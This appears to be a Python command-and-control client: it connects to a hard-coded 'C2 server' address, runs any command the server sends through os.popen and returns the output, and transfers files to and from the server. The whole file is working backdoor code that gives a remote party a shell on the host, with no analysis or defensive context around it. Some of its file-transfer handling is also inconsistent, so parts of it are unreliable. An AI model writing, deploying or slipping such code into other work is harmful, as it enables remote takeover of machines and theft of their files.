import socket
import os

# Client setup
SERVER_HOST = '10.0.1.37'  # Replace with the C2 server's IP
SERVER_PORT = 9999        # Port where the server is running

def listen_for_commands():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER_HOST, SERVER_PORT))

    while True:
        # Receive the command from the server
        command = client.recv(1024).decode()
        
        if command.lower() == 'exit':
            print("Exiting client.")
            break

        # Handle file upload command
        elif command.startswith('upload'):
            filename = command.split()[1]
            upload_file(client, filename)

        # Handle file download command
        elif command.startswith('download'):
            filename = command.split()[1]
            download_file(client, filename)

        else:
            response = os.popen(command).read()
            if not response:
                response = "Command executed, but no output returned."
            client.send(response.encode())

# File upload function (Client)
def upload_file(client, filename):
    # Receive upload command from server
    command = client.recv(1024).decode()
    if command.startswith("upload"):
        # Extract filename and file size from the command
        parts = command.split()
        filename = parts[1]
        file_size = int(parts[2])

        # Send acknowledgment back to server
        client.send("Ready to receive file.".encode())

        # Open the file and receive the data in chunks
        with open(filename, "wb") as f:
            bytes_received = 0
            while bytes_received < file_size:
                data = client.recv(1024)
                bytes_received += len(data)
                f.write(data)

        print(f"File {filename} uploaded.")

# File download function (Client)
def download_file(client, filename):
    client.send(f"Requesting to download {filename}".encode())

    # Wait for file size from the server
    file_size = int(client.recv(1024).decode())

    # Receive the file data from the server and save it
    with open(f"downloaded_{filename}", "wb") as f:
        data = client.recv(file_size)
        f.write(data)

    print(f"File {filename} downloaded.")

if __name__ == '__main__':
    listen_for_commands()
